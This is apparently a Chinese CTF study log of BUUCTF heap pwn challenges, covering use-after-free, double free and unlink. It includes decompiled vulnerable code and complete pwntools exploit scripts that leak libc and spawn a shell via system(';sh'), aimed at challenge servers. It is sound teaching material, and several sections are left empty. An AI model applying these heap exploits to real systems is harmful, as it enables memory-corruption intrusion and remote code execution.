# [BUUCTF-Pwn]刷题记录2

**用于入门练习**，堆利用相关，分类整理

# 1.UAF

## Introduction

•Use after free

•顾名思义，某块内存在释放后还能被用户使用；

•一般漏洞成因在于，free后没有将指针置为NULL，导致野指针的存在；

## Exercise

### metasequoia_2020_summoner

64位，保护全开

![image-20211101234430091](https://abc.p0lar1s.com/202111012344191.png)

背景：

![image-20211101234604920](https://abc.p0lar1s.com/202111012346956.png)

漏洞函数：

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  FILE *v3; // rdi
  unsigned int v5; // [rsp+1Ch] [rbp-224h]
  void **ptr; // [rsp+20h] [rbp-220h]
  const char *nptr; // [rsp+28h] [rbp-218h]
  const char *nptra; // [rsp+28h] [rbp-218h]
  char command[520]; // [rsp+30h] [rbp-210h] BYREF
  unsigned __int64 v10; // [rsp+238h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  v3 = _bss_start;
  setbuf(_bss_start, 0LL);
  sub_AF0();
  sub_B1B(v3);
  ptr = 0LL;
  while ( 1 )
  {
    printf("\nEnter your command:\n> ");
    if ( !fgets(command, 512, stdin) )
      return 0LL;
    if ( !strncmp(command, "show", 4uLL) )
    {
      if ( ptr )
        printf("Current creature: %s [Level %u]\n", (const char *)*ptr, *((unsigned int *)ptr + 2));
      else
        puts("You have no creature now.");
    }
    else if ( !strncmp(command, "summon", 6uLL) )
    {
      if ( ptr )
      {
        puts("Already have one creature. Release it first.");
      }
      else
      {
        nptr = strtok(&command[7], "\n");
        if ( !nptr )
          goto LABEL_11;
        ptr = (void **)malloc(0x10uLL);
        if ( !ptr )
        {
          puts("malloc() returned NULL. Out of Memory\n");
          exit(-1);
        }
        *ptr = strdup(nptr);
        printf("Current creature:\"%s\"\n", nptr);
      }
    }
    else if ( !strncmp(command, "level-up", 8uLL) )
    {
      if ( !ptr )
        goto LABEL_17;
      nptra = strtok(&command[9], "\n");
      if ( nptra )
      {
        v5 = strtoul(nptra, 0LL, 10);
        if ( v5 <= 4 )
        {
          *((_DWORD *)ptr + 2) = v5;
          printf("Level-up to \"%u\"\n", v5);
        }
        else
        {
          puts("Can only level-up to Level 4.");
        }
      }
      else
      {
LABEL_11:
        puts("Invalid command");
      }
    }
    else if ( !strncmp(command, "strike", 6uLL) )
    {
      if ( ptr )
      {
        if ( *((_DWORD *)ptr + 2) == 5 )
          system("cat flag");
        else
          puts("No, you cannot beat him!");
      }
      else
      {
LABEL_17:
        puts("Summon first.");
      }
    }
    else if ( !strncmp(command, "release", 7uLL) )
    {
      if ( ptr )
      {
        free(*ptr);
        ptr = 0LL;
        puts("Released.");
      }
      else
      {
        puts("No creature summoned.");
      }
    }
    else
    {
      if ( !strncmp(command, "quit", 4uLL) )
        return 0LL;
      puts("Invalid option");
      sub_B1B("Invalid option");
    }
  }
}
```

漏洞点分析：

此处申请一块0x10大小的空间用于存放召唤出来的东西，记为1号堆空间

![image-20211101234738426](https://abc.p0lar1s.com/202111012347457.png)

前述空间中的前八个字节用于存放召唤物名字的地址：

![image-20211101235044731](https://abc.p0lar1s.com/202111012350759.png)

后八个字节存放召唤物的等级：

![image-20211101235132801](https://abc.p0lar1s.com/202111012359217.png)

strdup会隐式调用malloc：

> strdup（）函数是c语言中常用的一种字符串拷贝库函数，一般和free()函数成对出现。
>
> strdup()在内部调用了malloc()为变量分配内存，不需要使用返回的字符串时，需要用free()释放相应的内存空间，否则会造成内存泄漏。该函数的返回值是返回一个指针，指向为复制字符串分配的空间；如果分配空间失败,则返回NULL值。

```c
char * __strdup(const char *s)
{
   size_t  len = strlen(s) +1;
   void *new = malloc(len);
   if (new == NULL)
      return NULL;
   return (char *)memecpy(new,s,len);
}
```

strdup调用malloc申请的大小取决于要复制的字符串的长度，**它会把我们输入的字符串（也就是召唤物的名字）忠实地放入它申请出来的堆空间**，将次空间记为2号堆空间

可是，释放召唤出来的东西时，本应该释放1号，但**没有free掉堆空间1，而是free掉了strdup使用malloc申请的2号堆空间**：

![image-20211101235715509](https://abc.p0lar1s.com/202111012357536.png)

要打败evil summoner，需要等级为5，但是我们最多只能level-up到4，怎么办呢？

我们先summon一个，会先后得到16字节的1号堆空间和16字节的保存名字的2号堆空间

![image-20211102014029647](https://abc.p0lar1s.com/202111020140738.png)

于是输入名字时用八个字节填充前八个字节，再填入5，这样后八个字节就是5

![image-20211102014841266](https://abc.p0lar1s.com/202111020148302.png)

再release，这样2号堆空间就变成了fastbin chunk

![image-20211102015101692](https://abc.p0lar1s.com/202111020151728.png)

![image-20211102015147426](https://abc.p0lar1s.com/202111020151458.png)

再召唤一个，即重新得到这个chunk，0x55ae381da030成为当前的一号堆空间，0x55ae381da050成为当前的二号堆空间，一号堆空间的最后八字节为5，表示我们召唤的东西等级已经达到5

![image-20211102015511764](https://abc.p0lar1s.com/202111020155806.png)

再strike即可

exp如下：

```
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
#p = process("./1")
p = remote('node4.buuoj.cn', 29157)
#e = ELF("./1")
#libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p.sendlineafter('> ', b'summon aaaaaaaa\x05')
p.sendlineafter('> ', b'release')
p.sendlineafter('> ', b'summon aaa')
p.sendlineafter('> ', b'strike')
p.interactive()
```

### hacknote

checksec:

![image-20211107172052779](https://abc.p0lar1s.com/202111071720812.png)

add():

![在这里插入图片描述](https://abc.p0lar1s.com/202111071720705.png)

sub_804862B：打印出实参地址+4处的地址指向的内容

![在这里插入图片描述](https://abc.p0lar1s.com/202111071721682.png)

![img](https://abc.p0lar1s.com/202111071721146.png)

gdb看一下堆块的布局更方便理解

![在这里插入图片描述](https://abc.p0lar1s.com/202111071722046.png)

delete()

![在这里插入图片描述](https://abc.p0lar1s.com/202111071722179.png)

printnote():打印时，参数为note块地址

![在这里插入图片描述](https://abc.p0lar1s.com/202111071723030.png)

思路：使用UAF泄露libc，计算system的地址，执行system(‘/bin/sh’)或获取shell

具体怎么泄露？先add chunk0，add chunk1，然后delete chunk0，chunk1，此时再申请add chunk2，大小为8. 那么chunk2的note块就是chunk1的note块，chunk2的content块就是chunk0的note块（fastbin的原则是LIFO）。此时向content2中写入0x804862B函数地址（保持不变，还是原来的）和puts@got地址

![image-20211107171138928](https://abc.p0lar1s.com/202111071719174.png)

如上图，system的参数是note块地址，即存放system函数地址的地址，这样肯定不行。但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以成功将content位置覆盖成 ‘;sh\x00’或‘||sh’，同样的然后printnote(0)就能执行system(system_addr+‘;sh\x00’)得到shell了

```
from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.symbols[func]
		system = base + libc.symbols['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
context.arch = 'i386'
context.os = 'linux'
binary = './hacknote'
context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn', 26278) if (len(argv) == 2) and (argv[1] == 'r') else process(binary)
#path = '/lib/i386-linux-gnu/libc.so.6'
def dbg():
    gdb.attach(p)
    pause()

def addnote(size, content):
    sla("Your choice :", 1)
    sla("Note size :", size)
    sa("Content :", content)

def deletenote(index):
    sla("Your choice :", 2)
    sla("Index :", index)

def printnote(index):
    sla("Your choice :", 3)
    sla("Index :", index)

def exit():
    sla("Your choice :", 4)

puts_plt_addr = elf.plt['puts']
puts_got_addr = elf.got['puts']
addnote(0x10, b'aaa')# 0
addnote(0x10, b'bbb')# 1
deletenote(0)
deletenote(1)
addnote(0x8, p32(0x804862B) + p32(puts_got_addr))# 2
printnote(0)
puts_true_addr = u32(p.recv(4))
print(hex(puts_true_addr))
system_true_addr, bin_sh_addr = ret2libc(puts_true_addr, 'puts', './libc-2.23.so')
print(hex(system_true_addr))
print(hex(bin_sh_addr))
deletenote(2)
addnote(0x8, p32(system_true_addr) + ';sh\x00')
printnote(0)
itr()
```

# 2.double free

## Introduction

待补充

可参考fastbin_dup.c：

```
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = malloc(8);
	b = malloc(8);
	c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	assert(a == c);
}
```

## Exercise

### metasequoia_2020_samsara

menu：

```
unsigned __int64 sub_A50()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("1. Capture a human");
  puts("2. Eat a human");
  puts("3. Cook a human");
  puts("4. Find your lair");
  puts("5. Move to another kingdom");
  puts("6. Commit suicide");
  printf("choice > ");
  return __readfsqword(0x28u) ^ v1;
}
```

主函数：

```
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int v3; // ebx
  int v4; // [rsp+Ch] [rbp-44h] BYREF
  int v5; // [rsp+10h] [rbp-40h] BYREF
  __gid_t rgid; // [rsp+14h] [rbp-3Ch]
  __int64 v7; // [rsp+18h] [rbp-38h] BYREF
  __int64 target; // [rsp+20h] [rbp-30h]
  __int64 v9; // [rsp+28h] [rbp-28h] BYREF
  __int64 v10; // [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v11; // [rsp+38h] [rbp-18h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  target = 0LL;
  puts("After defeating the Demon Dragon, you turned yourself into the Demon Dragon...");
  while ( 2 )
  {
    v10 = 0LL;
    menu();
    _isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1:
        if ( cnt >= 7 )
        {
          puts("You can't capture more people.");
        }
        else
        {
          v3 = cnt;
          *((_QWORD *)&ptr + v3) = malloc(8uLL);
          ++cnt;
          puts("Captured.");
        }
        continue;
      case 2:
        puts("Index:");
        _isoc99_scanf("%d", &v5);
        free(*((void **)&ptr + v5));            // No point to NULL
        puts("Eaten.");
        continue;
      case 3:
        puts("Index:");
        _isoc99_scanf("%d", &v5);
        puts("Ingredient:");
        _isoc99_scanf("%llu", &v10);
        **((_QWORD **)&ptr + v5) = v10;
        puts("Cooked.");
        continue;
      case 4:
        printf("Your lair is at: %p\n", &v7);
        continue;
      case 5:
        puts("Which kingdom?");
        _isoc99_scanf("%llu", &v9);
        v7 = v9;
        puts("Moved.");
        continue;
      case 6:
        if ( target == 0xDEADBEEFLL )
          system("/bin/cat /pwn/flag");
        puts("Now, there's no Demon Dragon anymore...");
        goto LABEL_13;
      default:
LABEL_13:
        exit(1);
    }
  }
}
```

exp:

```
from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.symbols[func]
		system = base + libc.symbols['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'
binary = './samsara'
context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn', 26330) if (len(argv) == 2) and (argv[1] == 'r') else process(binary)
#path = '/lib/i386-linux-gnu/libc.so.6'
def dbg():
    gdb.attach(p)
    pause()\

def add():
	sla("choice > ", "1")

def delete(idx):
    sla("choice > ", "2")
    sla("Index:", str(idx))

def edit(idx, num):
    sla("choice > ", "3")
    sla("Index:", str(idx))
    sla("Ingredient:\n", str(num))

def show_addr():
    sla("choice > ", "4")
    ru("Your lair is at: 0x")
    num = r(12)
    addr = int(num, 16)
    print(hex(addr))
    return addr

def set_fake_chunksize(size):
    sla("choice > ", "5")
    sla("Which kingdom?\n", str(size))

def getflag():
    sla("choice > ", "6")

add()# 0 
add()# 1
delete(0)
delete(1)
delete(0)
add() # 2 == 0
fake_chunksize_addr = show_addr()
fake_chunk_addr = fake_chunksize_addr - 8
print(hex(fake_chunksize_addr))
print(hex(fake_chunk_addr))
pause()
set_fake_chunksize(0x20)
edit(2, fake_chunk_addr)# edit(0, fake_chunk_addr)
add()# 3 == 1
add()# 4 == 0
add()# 5 == fakechunk
edit(5, 0xdeadbeef)
getflag()
itr()
```

### ACTF_2019_message

menu：

```
unsigned __int64 menu()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("==============================");
  puts("    MESSAGE RECORD SYSTEM     ");
  puts("==============================");
  puts("1. Add message                ");
  puts("2. Delete message             ");
  puts("3. Edit message               ");
  puts("4. Display message            ");
  puts("5. Exit                       ");
  puts("==============================");
  printf("What's your choice: ");
  return __readfsqword(0x28u) ^ v1;
}
```

结构体：

```
00000000 list            struc ; (sizeof=0x10, mappedto_8)
00000000 length          dd ?
00000004 nop             dd ?
00000008 content         dq ?                    ; offset
00000010 list            ends
```

设置bss段上结构体数组的的变量类型

```
struct list p[]
```

add():

```
unsigned __int64 add()
{
  int i; // [rsp+8h] [rbp-28h]
  int v2; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( cnt <= 10 )
  {
    puts("Please input the length of message:");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    if ( v2 <= 0 )
    {
      puts("Length is invalid!");
    }
    else
    {
      for ( i = 0; i <= 9; ++i )
      {
        if ( !p[i].content )
        {
          p[i].length = v2;
          p[i].content = malloc(v2);
          puts("Please input the message:");
          read(0, p[i].content, v2);
          ++cnt;
          return __readfsqword(0x28u) ^ v4;
        }
      }
    }
  }
  else
  {
    puts("Message is full!");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

delete():

```
unsigned __int64 delete()
{
  int v1; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( cnt <= 0 )
  {
    puts("There is no message in system");
  }
  else
  {
    puts("Please input index of message you want to delete:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( v1 < 0 || v1 > 9 )
    {
      puts("Index is invalid!");
    }
    else
    {
      free(p[v1].content);                      // no check, double free
      p[v1].length = 0;
      --cnt;
    }
  }
  return __readfsqword(0x28u) ^ v3;
}
```

edit():

```
unsigned __int64 edit()
{
  int v1; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( cnt <= 0 )
  {
    puts("No message can you edit");
  }
  else
  {
    puts("Please input index of message you want to edit:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( p[v1].length && v1 >= 0 && v1 <= 9 )
    {
      puts("Now you can edit the message:");
      read(0, p[v1].content, p[v1].length);
    }
    else
    {
      puts("Index is invalid!");
    }
  }
  return __readfsqword(0x28u) ^ v3;
}
```

display():

```
unsigned __int64 display()
{
  int v1; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( cnt <= 0 )
  {
    puts("No message in system");
  }
  else
  {
    puts("Please input index of message you want to display:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( p[v1].length && v1 >= 0 && v1 <= 9 )
      printf("The message: %s\n", (const char *)p[v1].content);
    else
      puts("Index is invalid!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

经典菜单主函数：

```
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  intial();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        read(0, buf, 8uLL);
        v3 = atoi(buf);
        if ( v3 != 2 )
          break;
        delete();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_13;
      add();
    }
    if ( v3 == 3 )
    {
      edit();
    }
    else
    {
      if ( v3 != 4 )
LABEL_13:
        handler();
      display();
    }
  }
}
```

exp:

```

```



# 3.unlink

## Introduction

1、简介：俗称脱链，就是将链表头处的free堆块unsorted bin中脱离出来，然后和物理地址相邻的新free的堆块合并成大堆块(向前合并或者向后合并)，再放入到unsorted bin中。

2、危害原理：通过伪造free状态的fake_chunk，伪造fd指针和bk指针，通过绕过unlink的检测实现unlink，unlink就会往p所在的位置写入p-0x18，从而实现任意地址写的漏洞。

3、漏洞产生原因：

Offbynull、offbyone、堆溢出，修改了堆块的使用标志位

更详细的原理：

```c
/*malloc.c  int_free函数中*/
/*这里p指向当前malloc_chunk结构体*/
if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
//修改指向当前chunk的指针，指向前一个chunk。
      p = chunk_at_offset(p, -((long) prevsize)); 
     
      unlink(p, bck, fwd);
}   
//相关函数说明：
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s))) 
/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/
#define unlink(P, BK, FD) {                                            \
    FD = P->fd;                                   \
    BK = P->bk;                                   \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      
             malloc_printerr (check_action, "corrupted double-linked list", P, AV);
    FD->bk = BK;                                  \
    BK->fd = FD;                                  \
    ...
}

```

举例：

```
1、伪造如下：
chunklist一般位于bss段上（是个全局变量），这个数组存储着我们申请的堆块的地址
chunklist = 0x0602280（P是将要合并到的堆地址，P存在于chunklist中，假设P = chunklist[0]或者说*chunklist = P）
一般存在edit函数能够对chunklist数组中存放的地址处的内容进行修改，利用其在P指向的堆块中写入（伪造）如下数据：
P_fd = chunklist - 0x18 = 0x602268
P_bk = chunklist - 0x10 = 0x602270
2、绕过：
define unlink(P, BK, FD) {                                            \
    FD = P->fd;                                   \FD = 0x602268
    BK = P->bk;                                   \BK = 0x602270
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))    \FD->bk  = *(0x602268+0x18) 即 *(0x602280) = P 
	\ BK->fd = *(0x602270+0x10) = *(0x602280) = P ,绕过！              
             malloc_printerr (check_action, "corrupted double-linked list", P, AV);
    FD->bk = BK;                                  \*(0x602268+0x18) 即 *(0x602280)  = 0x602270
    BK->fd = FD;                                  \ *(0x602270+0x10) 即 *(0x602280) = 0x602268
    ...
}
最终效果就是往chunklist[0]里面写入了chunklist[0] - 0x18的值！即写入了一个bss段上的地址，我们再利用edit函数修改bss段上的内容（一般是将原来存放的堆地址修改成got表地址，当然也可以是内存中任意地址），再利用edit函数即可修改bss段上的指针指向的内容，即完成在内存中任意写的操作
```

## Exercise



# 4.off by one

## Introduction



## Exercise



# 5.fastbin

## Introduction



## Exercise

